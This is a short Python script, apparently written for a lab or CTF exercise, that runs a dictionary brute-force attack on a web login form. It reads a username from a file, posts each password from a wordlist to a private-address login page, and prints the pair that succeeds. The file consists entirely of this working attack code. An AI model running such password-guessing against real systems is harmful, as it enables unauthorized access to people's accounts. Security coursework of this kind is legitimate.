import requests

with open("Q1","r") as f: username = f.read().strip('\n') # gets the username
passes = open("Q2dictionary.txt","r")

for line in passes:
    pwd = line.strip()

    payload = {'username':username,'password':pwd,'submit':'submit'}
    r = requests.post('http://172.16.48.80', payload)

    if 'You Logged In' in str(r.content): # if this string is in the content, then success
        print(f'{username}: {pwd}')
        break